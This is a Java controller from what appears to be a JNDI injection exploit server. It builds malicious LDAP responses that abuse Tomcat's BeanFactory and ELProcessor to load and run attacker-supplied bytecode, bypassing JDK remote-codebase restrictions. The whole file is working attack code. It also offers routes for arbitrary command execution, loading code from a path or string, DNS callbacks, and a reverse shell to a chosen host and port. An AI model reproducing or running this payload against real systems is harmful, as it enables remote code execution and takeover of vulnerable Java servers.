package com.example.exploit.controller;

import com.example.exploit.annotation.LdapController;
import com.example.exploit.annotation.LdapMapping;
import com.example.exploit.util.SerializeUtil;
import com.unboundid.ldap.sdk.Entry;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Base64;
import java.util.Hashtable;

@LdapController
@LdapMapping("/TomcatBypass")
public class TomcatBypassController {
    public static void processResult(Hashtable<String, String> params, Entry e) throws Exception {
        String code = "var bytes = java.util.Base64.getDecoder().decode('" + params.get("byteCode") + "');\n" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "method.setAccessible(true);\n" +
                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "clazz.newInstance();";

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\")"));

        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaSerializedData", SerializeUtil.serialize(ref));
    }

    @LdapMapping("/DnsLog/{url}")
    public static void dnsLog(Hashtable<String, String> params) throws Exception {
        BasicController.dnsLog(params);
    }

    @LdapMapping("/Command/{cmd}")
    public static void command(Hashtable<String, String> params) throws Exception {
        BasicController.command(params);
    }

    @LdapMapping("/Command/Base64/{cmd}")
    public static void b64Command(Hashtable<String, String> params) throws Exception {
        BasicController.b64Command(params);
    }

    @LdapMapping("/FromCode/{code}")
    public static void fromCode(Hashtable<String, String> params) throws Exception {
        BasicController.fromCode(params);
    }

    @LdapMapping("/FromPath/{path}")
    public static void fromPath(Hashtable<String, String> params) throws Exception {
        BasicController.fromPath(params);
    }

    @LdapMapping("/ReverseShell/{host}/{port}")
    public static void reverseShell(Hashtable<String, String> params) throws Exception {
        BasicController.reverseShell(params);
    }
}
